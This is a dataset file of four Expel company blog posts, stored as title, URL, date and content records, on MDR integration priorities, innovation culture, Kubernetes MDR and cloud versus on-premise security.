  Example({'title': "Why don't you integrate with [foo]?", 'url': 'https://expel.com/blog/dont-integrate-with-foo/', 'date': 'Oct 6, 2020', 'contents': 'Subscribe  EXPEL BLOG Why dont you integrate with [foo]? Security operations  8 MIN READ  YANEK KORFF  OCT 6, 2020  TAGS: MDR / Tech tools When youre looking for a managed security provider that purports to work with the tech you already have, you might be dismayed to hear that theres something you have we dont integrate with. How can that be? Is it just not something weve built yet? Well, why not? Ill tell you. By the end of this post youll understand why our thoughts on integration are likely different from what youve heard elsewhere, and what this means for you if you want to work with Expel. Building a model to prioritize needles, not haystacks Weve all heard the phrase, Its like looking for a needle in a haystack. Based on our many years spent working in the security industry, weve discovered that collecting piles of hay (AKA security signals) and hoping theres a needle or two in there isnt the most efficient way for us to protect anyones data and infrastructure. Thats when we also realized that more integrations doesnt mean better results. In fact, it often results in lots of noise and a bundle of false positives. However, theres still a general mindset in our industry that the best move is to put all the data in one spot and then begin doing all the things. A pile of data = amazing results? Not always. So why does everyone still love haystacks of data? To understand this, lets rewind the clock about 20 years and see where weve come from as an industry. When it comes to answering challenging questions and getting value out of data, weve historically followed the business plan popularized (or documented?) by the Underpants Gnomes of Southpark . It goes like this: Collect Underpants ? Profit! Sound familiar? Everybody loves the idea of gathering a pile of data and expecting amazing results somehow later on. Applying the lens of the Gartner hype cycle to new technologies like data warehousing, business intelligence and big data analytics  youll notice an uncanny parallel to this very same business model. A different approach: Asking questions first At Expel, we believe in taking a different approach when youre looking to get value out of data. It goes something like this: Identify the questions to which youll want answers. Identify the speed at which youll want these questions answered. Identify the data from which youll derive the answers. Organize the data to support these use cases. Profit! Go back to step 1 and revisit periodically. Unfortunately, this approach is twice as long as the last one. On the other hand, it works. Lets take a look at it in the context of security operations. How do we come up with questions? TL;DR: Were trying to find out if theres something bad happening in the environment were monitoring. This requires us to first ask ourselves a few questions. At Expel, weve come up with a standard set of initial follow-up questions that inform what we do if we do spot something bad. But how do we know if somethings bad? Well, our best bet is to have a lot of relevant context. For example, what technology generated the alert? Was the alert generated from an assumed role in AWS , if so  who assumed it? Has this user done this before? Did that user assume other roles at about the same time? Whats the historical use profile of that source user? The list goes on. Some of this context we can collect up front because it comes along with the alert. Other context may require follow-up queries against other systems or historical records on what is normal in the environment. Expel alert for suspicious login post-optimization with authentication history and frequency Why does speed matter? Because we triage a lot of alerts with a combination of technology and smart analysts. And chasing down the same kind of supporting information repeatedly is exhausting (and therefore, better to automate). When youre looking at alerts, the better the context you have the faster you can determine if what youre looking at is for sure bad, definitely a false positive or inconclusive. If an alert isnt definitely bad or definitely good, it needs follow up. We need to take time to investigate. Time is still of the essence here so we dont want to drag our feet, but we do this work substantially less often than we do triage work overall so we can afford to look around at potentially interesting data a bit. Another factor to consider is when were doing investigations, the questions we ask arent going to be quite as cookie-cutter. They can vary widely based on the alert and its surrounding initial context. Bottom line: Were going to do a lot of triage, and were going to do it quickly. We need a lot of context to help streamline (and potentially automate major portions of) this process. Inconclusive results are less frequent, the questions are hard to predict and will vary based on the situation. Getting answers using the old model Lets take a look at what happens when we use the underpants business model for security operations. We collect logs from everywhere and put them in one giant pile. We write some rules that try to make sense of this and create a huge volume of alerts. These alerts have limited context so we have mostly inconclusive results. Were not sure what to automate, so we throw people at the problem. I like to call this the lets build haystacks so we can search for needles in them approach. Were firmly in the category of biased dirty vendor here, so take this next statement with the appropriate grain of salt. Many of the security operations approaches we see in place today resemble this old model. When you see MDRs where SIEM is the foundation or theres co-managed SIEM offerings, youre probably looking at this model in action. We dont feel like this model works, so we approach things a bit differently. Applying the Expel model to security data Our approach is borne from both experience and several years of data that tells us the vast majority of incidents initial leads come from specific vendor technologies that generate high quality alerts. First, we collect only alerts (not logs) that come from overall high quality sources, i.e. hay that looks like needles in the first place. Yes, Andrew, we know theres an exception when it comes to our cloud integrations . Our alerts probably come with decent context already depending on what tech generated them. An EDR tool is a great example of a context-rich alert data source. Next, based on the alert and initial context, theres other context we can grab from different systems. Lets automate those pivots and data grabs. For some alerts, it may be possible to grab additional automated context without pivoting on much data. For example, what else happened on this system within +/- 5 minutes? What other systems communicated with this IP address? We now have rich context that enables our security analysts ( or robots ) to make good decisions relatively quickly. As we watch this play out, if we keep close track of what analysts do next, well continue to learn how we can automate the process. Now were left with a much smaller volume of investigations and much more time in our day . We dont need to answer the next set of questions with quite as much speed, because (1) the frequency of this work is way lower than for alerts and (2) were going to have to apply more human judgement. What does this mean for integrations? The primary advantage of a tech integration with a system that can collect context and orchestrate actions is speed and automation. When questions are predictable and the repeatability of getting answers means that speed provides a huge time advantage thats when integrations make the most sense. The disadvantages of integrations are twofold: you have to build them, and you have to maintain them.Thats time you could otherwise be spending making your analysts more effective. So to figure out what we should prioritize from an integration perspective, lets look at how we can get answers to questions in the timeframe in which we need them. We think about four integration levels to support different degrees of predictability and urgency. Note that the amount of work required increases by level. Levels of integration Level 1: Accessible When predictability of question and urgency are lower, its important that we can get the data, but we dont need an integration. This fits well into the kinds of data we use during an investigation versus during initial triage. A great example of this is a feature we call pivot to console. There are security technologies in play in some of our customer environments that either dont have APIs that allow us to gather additional context or historically have not generated signal that would have resulted in the identification of an incident. But they might support understanding what happened during one. For these technologies, our analysts can pivot to that techs console directly through the Expel Workbench, and access the data there. Tracking this activity also helps us prioritize what tech we might want to integrate. Level 2: Indirect, via SIEM Most of the data in most SIEMs weve worked with has been useful when paired with high-quality security signal. But the events, and many times the alerts produced by SIEMs themselves, are rarely the initial lead for an incident. Well want to pull this data in through our Expel Assembler and correlate, via automation, relevant context into our overall alert stream. An example of this might be authentication failures that indicate brute-forcing. Level 3: Direct, uni-directional When were looking at a data source that provides reasonably good security signal, or there are effective ways to filter the incoming data so that only the high-quality signal gets through, well want to integrate directly. Speed in this case is important both in finding a useful initial lead and perhaps in providing context. An example here might be some perimeter NGFW or IPS/IDS solutions that have good APIs and alerts with decent context. Level 4: Direct, bi-directional Technologies wed integrate in a bi-directional fashion not only provide high-quality security signal  the product on the other end can be modified to behave differently on the fly based on information were seeing. It also likely has its own query ability where we can ask a set of predefined questions and get answers quickly (we like to say the quality of your investigation is rooted in the questions you ask). These technologies are essential to high-quality triage and tend to get used quite a bit during investigations. EDR technologies fit well into this category. What does this mean for me? If youre looking to work with Expel, this model should help explain how we think about prioritizing integrations and which integrations provide the most value in the context of security operations. We spend most of our time on the investigative leads that have the highest likelihood to be an actual incident. Which means theyll require action  fast. The more time we spend chasing our tails on alerts (or events) that dont matter, the more time we waste and the higher the risk well miss the important stuff. And whats important is contingent on each of our customers unique environments. Which means were also going to be spending a lot of time getting to know you. All the more reason why we dont want to waste time journeying on paths to nowhere. From an integrations standpoint, this means we put vendor technologies (that we havent integrated) into three major buckets: Were interested in building this integration (levels 3 &amp; 4), but havent gotten to it yet. This is probably because we havent seen this widely deployed among our base of customers and prospects with whom weve spoken to date. Weve decided not to build a direct integration, because we can access that data or support investigations as needed through a SIEM with which we integrate (level 2). Weve decided not to build an integration at all (ever) because that data isnt used often enough for the work to be worth it (level 1). Follow @reefhack As everyone is well aware, the landscape of security technologies is immense and prioritization is critical  both for integrations and alerts themselves. Because technologies are always changing and growing, a given tech that we evaluated may have moved from one category to another. If you ever feel like weve got an integration in the wrong bucket, were always willing to listen and re-evaluate. I hope this helped shed some light on how and why we do things here at Expel  and maybe even inspired you to learn more. Were always happy to chat .'}) (input_keys={'title'}),
  Example({'title': "Why Expel doesn't do R&amp;D | Expel", 'url': 'https://expel.com/blog/why-expel-doesnt-do-rd/', 'date': 'Aug 16, 2018', 'contents': 'Subscribe  EXPEL BLOG Why Expel doesnt do R&amp;D Expel insider  11 MIN READ  PETER SILBERMAN  AUG 16, 2018  TAGS: Framework / Great place to work / Mission I recently introduced myself to a new investor as Director of Innovation. He looked at me like Id just said I was a Disney Imagineer. Now, I love a good princess flick as much as anyone but Im no Imagineer. At any other company, Id be a director of R&amp;D. But as the clickbaity (sorry) title says, we dont do R&amp;D at Expel. At Expel weve consciously chosen to avoid the term R&amp;D to define a team, a job role or anything else. Instead, we use words like experiments or  innovation. A lot of thought went into this decision. You see, were trying to challenge a lot of the standard ways managed services operate and that means we need to constantly challenge ourselves to do things in new ways and not just cut and paste processes from our past just because weve always done it that way. That includes R&amp;D. Or, in this case, innovation. ========================= But first  a brief disclaimer ========================= Before I dive in though let me set the record straight on a couple things. This blog outlines research in the field of cybersecurity. Im sure some of the challenges I describe exist in other industries, but I dont have the experience to talk about them in that context. Im personally guilty of many of the bad behaviors well discuss. Expels approach tries to address some of the challenges Ive both witnessed and experienced. Finally  yes, I know not every research group has all of the challenges Im about to outline. And  yes, I know not every researcher exhibits all the behaviors Im about to outline. And  yes, Im sure you and your group have none of these challenges. Whats in a name? Quite a bit, it turns out. Think about it. R&amp;D defines a group of people. You either belong or you dont. At Expel, we believe anyone can come up with a game changing idea. While some folks in the company are more focused on experimentation, we dont want to exclude anyone. We view innovation as the constant flow of ideas from anywhere in the company to a backlog that is actioned by individuals or teams across an organization. This means that everyone with a good idea or desire should be able to participate. Thats why we choose the term innovation. Anyone can be innovative. But you cant describe yourself as research and development(y), especially if youre not in the group. Theres also a flaw baked into the name itself. Research and development defines a workflow. And, just as its name suggests, a research group does research first and then develops a solution to a problem. But too many research groups view their job as done once theyve handed off their idea to engineering. Too often, they dont have any skin in the game when it comes to getting that solution into production. If the solution falls apart in engineering, culturally, they arent encouraged to see that as a failure. Instead, theyre more likely to end up in a food fight with engineering (and possibly product management). You may recognize some of these statements: R&amp;D to engineering: You move too slow R&amp;D to engineering: This feature is way more important than Windows X backwards compatibility! Engineering to R&amp;D: Everything you hand us works in 10% of situations. Engineering to R&amp;D: This isnt engineering quality code, rewrite it. How to create a healthy innovation backlog A healthy research (or innovation) backlog typically includes a bunch of tactical ideas that are being researched to solve day-to-day challenges the company faces. But we think the backlog also needs to include what we call crazy town ideas (sometimes called moonshots). These ideas probably dont correlate to the day-to-day pains and problems your company faces. Theyre forward-looking  and, as we like to say, anticipate where the puck is going ( #ALLCAPS ). Having a diverse innovation backlog is critical. But when a company has a traditional R&amp;D structure (that is, when a group is labeled R&amp;D), its effectively telling the rest of the company, Hey these are the people to come up with new ideas. Flip it around and what employees can hear (or think) is, Well, my ideas dont matter so I wont think critically or offer feedback. Or, perhaps, Well, since Im not on the R&amp;D team, Im going to research over here in a corner and not tell anyone about it. Or, worst of all, I cant participate in R&amp;D so Im going to take my ideas to another company. Innovation is a company-wide activity. Having a backlog of ideas siloed off in R&amp;D isnt an effective way to tackle innovation. Read on to see how weve tried to approach things differently. Three signs that your R&amp;D team is stifling innovation It can be hard, at first, to recognize when R&amp;D has put up unnecessary hurdles. Nobody picks up a bullhorn and announces them. Theyre more subtle and silent. Here are three signs that youve got them. Theres no single view of all research projects: No one person can identify project owners, deduplicate similar projects, track project status, etc. This lack of visibility can impact cost and engineering velocity. Great ideas stay hidden: New ideas that are great may never get brought up. If youre finding employees are contributing to or creating their own open source projects thats a possible sign your innovation is going elsewhere. A-ha! Engineering: Large projects stay hidden until a great big reveal, ambushing teams across the company who could have been helpful / involved. Youre solving irrelevant problems: Over time, your R&amp;D group will likely move further away from relevant problems. Then, theyll wonder why other teams arent bringing up new issues for them to tackle. If your R&amp;D group is landing new projects, but the projects arent well received theres a good chance theyre growing disconnected from the day-to-day challenges your company is facing. This happens all the time in security where challenges often change on a daily or weekly basis. If any of these warning signs sound familiar you probably need to rethink your approach to how you innovate. Building an effective innovation engine (aka what Ive done at Expel) I was one of the first employees at Expel, so the only thing I could do was innovate. But, as a new organization, it also gave me a unique opportunity to experiment with new cultural norms that favor innovation, reward failures and involve everyone. Here are four things were doing. Zero Day indoctrination Expels culture is unique. Were a transparent managed security provider and transparency is core to our culture. Every new employee listens to a presentation called the Expel Palimpsest. It explains the fundamental tenets of our culture. And it includes this slide. This slide summarizes Expels overall approach to innovation  it involves everyone and it starts on day zero. The innovation slides are aimed at everyone  not just our security analysts or engineers. Now, a single slide doesnt create a culture. That comes from day-to-day reinforcement of the messages on the slide with actions. One way we reinforce that is through a weekly experiment meeting and our monthly all hands meeting. Weekly experimentation meeting There are three main goals of our weekly experimentation meeting: Review new ideas (with a focus on prioritization). If were going to consider an idea for prioritization, this is where we define concrete next steps that include failure/success criteria for the first pass. Its a delicate balance when a new idea comes in that isnt worth actioning. We usually encourage them to think more about their idea while exposing them to alternatives to what they proposed. As you build trust, youll find youre able to more directly say this is probably not worth actioning because of X Y Z. Update status of ongoing experiments. For experiments that are already underway we like to focus on what progress has been made, discussing ideas about how to improve them and identifying (and clearing) roadblocks that might slow it down. Review results from individuals or teams. When we review the results of an experiment theres a lot of discussion. Did it fail or succeed? If it failed, do we want to try something different or call the whole experiment a failure? If it succeeded, is it still a high priority experiment? A different person runs our weekly meeting every week. Changing up who leads it is important; it breaks up the monotony and allows individuals to focus discussion on what matters most from their perspective. Changing who runs the meeting also reinforces that innovation is democratized across the whole company. Case in point, last week one of our badass interns ran the meeting. Anyone at Expel can attend the experiments meeting and any individual or team can work on a prioritized experiment. We use Trello to track our ideas as experiments. The diagram below outlines the various states an experiment can live in as it moves from concept to completion. Phases of an experiment An important note: These phases are specific to experiments related to detection, hunting, and response. The phase may differ if we were doing different types of experiments (for example, evaluating new database performance). Scrub  This is where new ideas go. Every month at our company all hands we acknowledge everyone who submitted a new idea, regardless of what the outcome was. Untested ideas  After we scrub an idea, we move it to untested unless were able to resource it immediately. We try to keep this prioritized, but try is the operative word there. Test in progress  At this phase, weve decided to see how viable the idea is. We do our best to scope these tests so they have a quick turn around  a week or two on an initial idea is ideal (though there are exceptions). The goal here is to see if the concept holds up at some small scale. Note: at this point and going forward any experiment/idea can move from a given phase in the workflow to either blocked or failed state. If we fail well have a mini post-mortem write up about what we tried, where we failed and anything we would do differently. That way if we want to pick up a failure a year from now we can recall what happened. Viable  If the test was successful, where success is reviewed and determined by everyone attending the weekly meeting, the experiment goes into the viable state. This state is the queue where engineering (or researchers with an engineering background) can go to pick up work. The queue is also another point where we prioritize. We can take resources off of other projects to move something into a release state if we think its that important. Release: experimental  Once weve taken the viable idea and resourced it to get it quickly into production, the idea/feature/experiment is marked as Experimental. This means the only people reviewing the output are those involved in the experiment and possibly one customer. Release: limited availability  At this phase, weve reviewed the experimental results, run the experiment on varying data types/sizes and were reasonably confident its stable, meaning the variance is limited. Once an experiment gets to this phase weve got our most senior analysts looking at it. Release: general availability  Finally, when an idea becomes generally available, it means weve got strong documentation, monitoring, logging and support. Weve had two or three associate analysts review it, and they were able to consistently draw the same conclusion. Associate analysts are generally analysts who are working their first security job. Two critical partners: internal and external customers Our internal customers for the experiments are involved in the process from inception to delivery. Heck, it may have been their idea in the first place and they just didnt have the dev skills to execute it. By meeting with any and all stakeholders, everyone gets an opportunity at every phase to ask questions like, Is this still the most important thing we should resource? so we can continuously prioritize experiments that have (or could have) an impact. Too often, researchers go heads down for three months, come back up and the ground has shifted out from under them so that the problem they have solved no longer exists because of _______. We also involve our customers as early as possible  even at the experimental release stage. Its one of our core tenets. Well talk to the customer before we run an experiment, so they know were going to try something new. Then, after the experiment, we provide results even if it went poorly. While this approach works for us, youll have to figure out how and when you want to engage customers. Weve found that by engaging customers early, they get the opportunity to offer feedback (which they like) and we learn things early in the process that ultimately save us time. Through these conversations, trends can emerge. Youll know youve really hit the win button when customers are proactively engaging you with new ideas. Yay! Another failure. If fear of failure is part of your culture it will squash creativity. Youll always hit your target because you arent aiming outside your comfort zone. This is very dangerous for the longevity of any company (unless you are flush with cash and can acquire companies who dont fear failure). If youre transparent about your experimental results, you naturally destigmatize the fear of failure. And when the whole company sees experimentations at all levels of the business it gets even more interesting. The greater danger for most of us lies not in setting our aim too high and falling short; but in setting our aim too low, and achieving our mark.  Michelangelo As a young company thats still growing, we want to fail fast, and failures have to be applauded. Again, we make sure that were walking the walk  at the highest levels. A director saying great job failing guys thats what we want doesnt have the same impact as the CEO standing up in front of the company month after month and saying Weve got to fail more. The importance of celebrating failure in a company is that it removes the pressure of always being right. This pressure can swallow up impactful ideas and prevent them from being shared. Reed Hastings CEO of Netflix summarized this sentiment well: Our hit ratio is way too high right now, Hastings said. So, weve canceled very few shows  Im always pushing the content team: We have to take more risk; you have to try more crazy things. Because we should have a higher cancel rate overall.  Reed Hastings The approach Ive outlined here may or may not work at your company. The point is, that you should always be evaluating how youre innovating (or R&amp;Ding). At Expel, were continually trying to figure out ways to involve more people in the innovation process. A new initiative were starting internally is twitch for innovation where we set up fixed times to hold Zoom conference screen shares. The person sharing their screen talks about how theyll work on an experiment, and actually does a bunch of the research with people watching. Anyone in the company can join the session, watch what they do, how they think and ask questions. This idea isnt new. In fact, well-known researchers like Cody Pierce , and Silvio Cesare have been live streaming various research sessions. Being able to watch a research professional is invaluable. Theres always something to learn no matter how experienced you are. Eventually, wed love for customers to be able to watch as well. Conclusion I know changing culture is hard and one meeting a week likely wont change anything. Coming to Expel, I had the benefit of defining a new culture (vs. changing an existing one). That said, here are a few ideas that might help in your innovation journey. Consider over communicating research status. Go to weekly engineering planning or sprint meetings. Make sure they know what youre working on and make it clear to engineering that nothing will get dropped in their lap. Emphasize that bringing something to production will be a collaborative effort. Require people responsible for experiments meet with engineering to understand code coverage and code style guidelines. Delivering your results with unit tests that meet code coverage requirements and style guidelines is a great way to show you respect engineering. Have engineers pair up with researchers (and vice versa). It will help each team build a healthy respect for what each other brings to the table. A weekly meeting to discuss new public research or internal research is a good first step to improving visibility. As you build trust, you can move to a more formal collaborative process but starting out with a meeting to discuss ideas and results is a good first step.'}) (input_keys={'title'}),
  Example({'title': 'Why MDR for Kubernetes is great news for your org', 'url': 'https://expel.com/blog/why-mdr-for-kubernetes-is-great-news-for-your-org/', 'date': 'Feb 15, 2023', 'contents': 'Subscribe  EXPEL BLOG Why MDR for Kubernetes is great news for your org Security operations  3 MIN READ  DAN WHALEN  FEB 15, 2023  TAGS: Cloud security / MDR The potential for Kubernetes is huge, and the challenges facing early adopters are, too. We announced the first-to-market MDR for Kubernetes offering on Monday , and wed like to share some key considerations for your organization. We recently detailed the rapid growth of Kubernetes and container environments and walked you through what our customers see as their biggest challenges . Today lets talk about how managed detection and response (MDR) for Kubernetes (k8s) makes the future a brighter place for organizations that rely on in-house application development. For starters, MDR for Kubernetes helps orgs secure operations across every attack surface . It removes blind spots for the security team, arms the DevOps team to handle remediation, and lets developers do what they do bestbuild applications that propel the business. MDR for Kubernetes provides insights across three core layers of Kubernetes applications: Configuration: More than half of organizations using Kubernetes found at least one misconfiguration in the past year , and failure to get ahead of the problem opens the door for attackers. MDR for Kubernetes identifies cluster misconfigurations and references the Center for Information Security (CIS) best practices benchmark to recommend enhancements, increasing your security teams resilience. Control plane: No matter how far along you are on your journey, MDR for Kubernetes translates complexity into clarity by:  Integrating with cloud k8s infrastructures, like Amazon Elastic Kubernetes Service (EKS) and Google Kubernetes Engine (GKE);  Analyzing audit logs; applying custom detection logic to alert on malicious or interesting activity; and  Providing clear remediation guidance. Run-time security: Bring-your-own-tech models maximize return on investment (ROI). MDR for Kubernetes can integrate with a broad portfolio of run-time container security vendors to provide the answers you need for the tech you already use. MDR for Kubernetes also aligns to the MITRE ATT&amp;CK framework, helping your SecOps team quickly remediate and build resilience for the future. Expel-authored detections learn and adapt based on activity in your environment, keeping you ahead of threats. Youll develop your own insights and best practices to track k8s security posture over time, and you wont be flying without a net: a security operations center (SOC) is on hand with 247 triage and support. Plus, MDR for Kubernetes generates deeper awareness across your cloud infrastructure and drives more remediation recommendations where it matters to your business the most. Secure the business MDR for Kubernetes helps orgs remove their security blind spots by cultivating insight across the entire cloud attack surface. Security teams get important detection and response capabilities without causing friction for developers, letting them focus on building apps that matter to the business. Specifically, orgs can monitor and secure k8s across control plane, configuration, and container runtime security layers. Continuous monitoring of event logs, security alerts, and configuration details demystifies the complexity of Kubernetes, providing actionable security findings and recommendations to improve security posture over time. Improve ROI Any new technology investment must pass the ROI test. The great news here is that MDR for Kubernetes boosts return by working with your existing infrastructure. This means no matter where you are on your security journey in Kubernetes, MDR for Kubernetes can provide detection and response capabilities without requiring additional investment. And importantly, as you mature, its capabilities grow with you. CISOs and their teams quickly discover that enhanced visibility into the Kubernetes environment improves security results. They gain complete coverage across cloud infrastructureand with our new offering, its all in the Expel WorkbenchTM platformand eliminate silos between DevOps and security, accelerating the business. Enable the business Security is often viewed as an inhibitor to business performancea cost center and point of friction. According to Red Hat, 55% of organizations have had to delay application deployment due to security concerns . With MDR for Kubernetes, organizations can continue to ship software with the added confidence that continuous security monitoring provides. Security teams get important visibility and insight, DevOps teams spend less time chasing noisy security alarms, and developers are enabled to do what they do bestbuild what the business needs. Doing this at scale requires deep visibility, effective detection and response capabilities, and an ability to anticipate and address risks in Kubernetes before they result in business impact. Stay tuned for more k8s insights and resources. In the meantime, have a look here (and see what one customer architect says about why his org is happy to be aboard)'}) (input_keys={'title'}),
  Example({'title': 'Why the cloud is probably more secure than your on-prem ...', 'url': 'https://expel.com/blog/why-cloud-probably-more-secure-than-on-prem-environment/', 'date': 'Dec 17, 2019', 'contents': 'Subscribe  EXPEL BLOG Why the cloud is probably more secure than your on-prem environment Security operations  8 MIN READ  ANDREW PRITCHETT  DEC 17, 2019  TAGS: Cloud security / Planning / SOC Cloud this, cloud thatthe cloud has sure become the buzzword in IT, dev ops, and cybersecurity, hasnt it? According to Gartner, By 2022, up to 60% of organizations will use an external service providers cloud-managed service offering, which is double the percentage of organizations from 2018. 1 However, there are still plenty of cloud skeptics out there, wondering whether all of those who have gone before them are further on the path to demisefrom a security standpoint, that is. We believe the skeptics can rest easy. Cloud service providers (CSP) know that their profitability and reputation depend on their ability to maintain security for customer data. Therefore, security is a focus for all the CSPs, and theyve each made significant investments in physical security and hiring security experts. Is Data More Secure On-Premise? One reason that some of us struggle with putting data in the cloud is that we have a warm and fuzzy feeling about having our data physically close. We believe that if the data is in our own data centersat the end of the hallwaythen its somehow more secure. The reality is that the physical location of the data has little to do with its security. What affects security most is access and control. If were honest with ourselves, how many times have we walked past the data center to find the door propped open with a box fan? How many times have we seen an unescorted visitor roaming that same hallway looking for the restroom? We have a human tendency to become comfortable in our own surroundings, but when we become comfortable, we become complacent. This is why incident responders find abandoned vendor access points in on-premise data centers on the regular. On-Premise vs. Cloud Security Here are five reasons why your data might just be safer in the cloud. Reason #1: Physical Access Unlike most of the environments weve all worked in, CSPs have incredible standards for physical access controls. If you dont believe me, check out some of the data center tours that are posted on YouTube . CSPs exercise security defense in layers, starting with having very restricted access to the places where customers data is stored. Authorized employees must pass through security gates and fences, security guards, and surveillance cameras. The buildings are designed with mantraps and limited ingress and egress points and are also equipped with biometric scanners. Additionally, anytime an employee has to perform any kind of maintenance within the data center, the work is rigorously audited. Those employees even have to have proprietary hardware and chips in their badges or other devices in order to be authenticated and allowed inside the data center. If somehow a bad actor were to thwart all of these controls and enter the data centerwhich is pretty unlikelyyour data is still protected by additional layers of security. CSPs protect your data with anonymity, encryption, and replication. In addition to using several layers of encryption for data at rest (either AES256 or AES128), CSPs also distribute each customers data across multiple computers. 2 Here is a snippet from Googles website that explains in more detail how they protect your data within their data centers: Rather than storing each users data on a single machine or set of machines, we distribute all dataincluding our ownacross many computers in different locations. We then chunk and replicate the data over multiple systems to avoid a single point of failure. We name these data chunks randomly, as an extra measure of security, making them unreadable to the human eye. 3 The TL;DR: Most businesses couldnt achieve this level of physical security on their own, given the sheer amount of resources youd need to do it, like real estate, personnel, and technology. Reason #2: Resiliency An important aspect of physical data security thats often neglected is resiliency. When I say resiliency, I mean that when you store data somewhere, you expect that when you need it again, you can go back and itll still be there as you left it. CSPs know that business data is often mission-critical so they invest resources to offer their customers consistent reliability. Objects are stored redundantly on multiple devices across multiple facilities by CSPs, no interaction from the customer required. For example, Amazon Web Services (AWS) states that they design their redundancy for Amazon S3 to sustain the concurrent loss of data in two facilities. 4 What reliability does this represent? To put in perspective, in the last month, according to Cloud Harmony Amazon S3 had 100 percent availability across all 18 regions globally with zero minutes of recorded downtime. Google Cloud Storage reported a total of 3.88 minutes of downtime from two of their 26 regions and Microsoft Azure Cloud Storage reported a total of 48.13 minutes from only one of their 36 regions. Because none of the CSPs reported multiple concurrent data center outages, most users wouldnt have noticed there was an outage. Can your IT department guarantee that you will have nearly 100 percent availability and reliability? Most companies probably have some level of redundancy at maybe one other site and perhaps a set of tapes stored elsewhere that they could access if things really went sideways. But the reality is that backups and archives take time to put back into production, and youll probably experience some data loss in the delta between when the backup was last written and when it is put back into production. The redundancy and data arrays offered by CSPs allow real-time, seamless continuity. Additionally, customers have the ability to automate additional redundancy across other regions and countries to accommodate for regional catastrophic events, such as hurricanes, earthquakes, or other natural disasters. Unless your company is already a global operation with offices around the world, your IT department likely cant achieve this level of redundancy. Reason #3: Significant Investment in Security Expertise In determining the security of data, we often evaluate two things: physical access and virtual access. I mentioned a few reasons why CSPs can provide better physical access controls, but there are some ways that CSPs can offer better virtual access controls, too. According to Microsoft, the company has a team of more than 3,500 global cybersecurity experts that work together to help safeguard your business assets and data in Azure. 5 Their cybersecurity team alone is larger than the employee size of most businesses in the United States. Its a luxury for most companies to have two or three people on their staff who focus on cybersecurity. The reality is that most companies hire a bunch of developers and engineers for production, a small staff for IT and the help desk, perhaps an information security officer, and maybe someone on the IT team gets some extra security or incident response training (I know, I know its not just you who feels this way!). With all of the cybersecurity expertise at their disposal, CSPs can make sure that advanced security features are built into every product and service to keep data protected at every layer. These cybersecurity teams include security engineers, security architects, security analysts and incident responders, data scientists, penetration testers, vulnerability engineers, code reviewers, quality assurance, and compliance auditors and specialized feature development teamsand their single focus is on providing and improving security. Reason #4: Development of Best-in-Class Access control Systems Because of the vast security expertise they have on staff, CSPs have the ability to develop best-in-class authentication and access control systems. By now youve probably seen the Login with Google button on some of your favorite websites and thought, Thats odd this isnt even a Google website. Or perhaps youve seen  Log in with Facebook  or  Log in with GitHub . Sure, the site youre on might not be owned by Google or the others, but many companies have come to realize that its difficult to continually stay updated on the latest attacks against authentication systems. Storing passwords is difficult and potentially risky. Keeping up with the latest multi-factor services is a constant sprint, and striking a balance between easy password reset functionalities and not giving the wrong person access to protected data is difficult to get right. CSPs have the expertise and the resources to stay on top of all of these concerns and deliver best-in-class control systems. These control systems include the secure management of passwords and keypairs, multi-factor authentication services, mitigating controls assigned to password resets, protection from brute force and malicious login attempts, key vaults, conditional access policies (geolocation, trusted devices/clients, trusted countries/regions, IP ranges), role-based access control, automated DDoS defenses, firewalls/VPC controls, secure VPN protocols, audit logging, and alerting. All of these systems are closely integrated, tested, and audited by CSPs on a continual basis. It would take a large team of developers and security engineers to even begin to replicate these control systems on-premise, and that doesnt even take into account the additional maintenance and testing required to support and validate these systems. That said, just because CSPs do a great job protecting their own infrastructure doesnt mean that once you put your data in the cloud, you can wipe your hands clean of all things security. CSPs are responsible for protecting the global infrastructures that run all of the cloud services: the hardware, software, networking, and facilities that run all of the cloud platform services offered by the provider. As the customer, youre responsible for the security of your data and the resources you create in the cloud. That includes protecting the confidentiality, integrity, and availability of your data and maintaining any compliance requirements for your workloads, whether you use the controls provided by your provider or you bring your own. Reason #5: Vulnerability and Patch Management CSPs have entire teams of people solely devoted to detecting vulnerabilities and conducting patch management. These teams scan for software vulnerabilities using a combination of commercially available and purpose-built tools. They also conduct intensive automated and manual penetration testing, software security reviews, and external audits. These teams are dedicated to finding vulnerabilities before the attackers do. For the average company, the IT Manager is the vulnerability scanner and auditor, and they play that role in addition to looking after all their other duties and responsibilities. The IT Manager may get lucky and have some funding at the end of the year to put toward a third-party assessment or penetration test. Its then the responsibility of the IT Manager to make sure that all of the system owners are following up with the recommendations and patchwork suggestions made by those third parties. The reality is that this kind of work can be exhausting for small teams, especially when the IT team is already wearing many hats. Thats why it often falls through the cracks. Think about how many organizations fell victim in May 2017 when WannaCry ransomware used the EternalBlue vulnerability to spread itself. Microsoft announced the vulnerability on March 14, 2017, in security bulletin MS17-010; however, two months later, millions of systems remained unpatched. 6 Security: Still A Shared Responsibility Notice that I talked about why the public cloud can be more secure and not why the cloud is more secure. Sure, CSPs have a great culture of security. Theyve built many features and services to make it possible for you to experience data security, but youve got to take the initiative to enable the security controls theyre offering. If you dont take the time to learn about the security features and controls at your disposal and you dont turn them on, they wont do you any good. For example, multi-factor authentication and conditional access policies are great features but they arent automatically configured or enforcedyouve got to do a little bit of the legwork here. Most cloud providers offer security best practice documents or security checklists . These are a helpful starting point to learn about some of the security features and controls available to you. Remember, you arent their first customer, meaning that the CSPs know their own services better than anyone and they know what other customers experienced when they havent followed security best practices with their services. When you sign up with a CSP, they will guide you on what to do. Take the time to learn about the security features and controls that are available. And use them. Whether you stick with on-premise solutions or migrate to the cloud, Expel offers a managed security and detection response system with multiple integrations to endpoint, SIEM, and cloud software systems. Contact us today to see how we can help you make your system more secure. 1: Gartner Press Release Gartner Forecasts Worldwide Public Cloud Revenue to Grow 17% in 2020, 13 November 2019. https://www.gartner.com/en/newsroom/press-releases/2019-11-13-gartner-forecasts-worldwide-public-cloud-revenue-to-grow-17-percent-in-2020 2: Encryption at rest in Google Cloud https://cloud.google.com/security/encryption/default-encryption 3: Data and Security https://www.google.com/about/datacenters/data-security/ 4: Data protection in Amazon S3 https://docs.aws.amazon.com/AmazonS3/latest/userguide/DataDurability.html 5: Strengthen your security posture with Azure https://azure.microsoft.com/en-us/overview/security/ 6: Microsoft Security Bulletin MS17-010  Critical https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010'}) (input_keys={'title'}),
